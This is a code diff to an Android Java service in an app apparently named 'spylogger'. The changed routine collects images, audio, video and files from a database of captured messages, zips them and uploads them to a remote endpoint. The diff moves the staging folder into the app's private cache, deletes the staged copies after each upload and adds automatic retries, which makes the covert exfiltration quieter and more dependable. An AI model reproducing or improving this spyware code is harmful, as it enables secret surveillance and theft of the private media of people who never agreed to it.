@@ -1,7 +1,6 @@
 package com.gravatasufoca.spylogger.services;
 
 import android.content.Context;
-import android.os.Environment;
 import android.util.Log;
 
 import com.gravatasufoca.spylogger.dao.DatabaseHelper;
@@ -40,7 +39,7 @@ import java.util.List;
  */
 
 public class FcmHelperService {
-    private static final int MAX_MENSAGENS = 10;
+    private static final int MAX_MENSAGENS = 5;
     private Context context;
     private FcmMessageVO fcmMessageVO;
     private SendArquivoService sendArquivoService;
@@ -174,27 +173,26 @@ public class FcmHelperService {
 
     private void reenviarArquivos(){
 
-        File outputDir = Environment.getExternalStorageDirectory();
+        File outputDir = context.getCacheDir();
         File dirArquivos=new File(outputDir+"/smartlogs");
-        if(dirArquivos!=null && dirArquivos.exists() && dirArquivos.canWrite()){
-            dirArquivos.delete();
-            dirArquivos=new File(outputDir+"/smartlogs");
-            if(dirArquivos!=null){
-                if(!dirArquivos.mkdir()){
-                    return;
-                }
+        if(dirArquivos.exists()){
+            File[] files=dirArquivos.listFiles();
+            for (File f: files) f.delete();
+        }else {
+            if (!dirArquivos.mkdir()) {
+                return;
             }
         }
 
         DatabaseHelper dbHelper = new DatabaseHelper(context);
         Dao<Mensagem, Integer> daoMensagem;
-        GenericRawResults<Object[]> raws;
+        GenericRawResults<Object[]> raws = null;
         List<File> arquivos = new ArrayList<>();
         Iterator<Object[]> iterator;
         try {
             daoMensagem = dbHelper.getDao(Mensagem.class);
 
-            raws = daoMensagem.queryRaw("select id,tipoMidia,tamanhoArquivo,dataRecebida from mensagem ", new DataType[]{
+            raws = daoMensagem.queryRaw("select id,tipoMidia,tamanhoArquivo,dataRecebida from mensagem where tipoMidia in('IMAGEM','AUDIO','VIDEO','GIF','ARQUIVO')", new DataType[]{
                     DataType.INTEGER,DataType.ENUM_STRING,DataType.LONG,DataType.DATE_LONG
             });
             iterator = raws.iterator();
@@ -215,11 +213,14 @@ public class FcmHelperService {
                     File arquivo=Utils.getMediaFile(
                             mensagem.getTipoMidia(),
                             mensagem.getTamanhoArquivo(),
-                            mensagem.getDataRecebida(), 1);
+                            mensagem.getDataRecebida(), 2);
                     if(arquivo!=null){
                         File tmp=new File(dirArquivos,mensagem.getId()+"");
-                        Utils.copyFile(arquivo,tmp);
-                        arquivos.add(tmp);
+                        if(!tmp.exists()){
+                            tmp.createNewFile();
+                            Utils.copyFile(arquivo,tmp);
+                            arquivos.add(tmp);
+                        }
                     }
 
                 } catch (Exception e) {
@@ -232,6 +233,8 @@ public class FcmHelperService {
                         if(zipado!=null){
                             envioArquivoVO.setId(null);
                             enviarArquivo(zipado);
+                            File[] files=dirArquivos.listFiles();
+                            for (File f: files) f.delete();
                         }
                         arquivos.clear();
                     }
@@ -241,11 +244,23 @@ public class FcmHelperService {
                     if(zipado!=null){
                         envioArquivoVO.setId(null);
                         enviarArquivo(zipado);
+                        File[] files=dirArquivos.listFiles();
+                        for (File f: files) f.delete();
                     }
                 }
             }
         } catch (SQLException e) {
             Log.e("spylogger", e.getMessage());
+            Log.i("spylogger","tentar novamente...");
+            try {
+                Thread.sleep(2000);
+                reenviarArquivos();
+            } catch (InterruptedException e1) {
+            }
+        }finally {
+            try {
+                raws.close();
+            }catch (Exception e){}
         }
     }
 
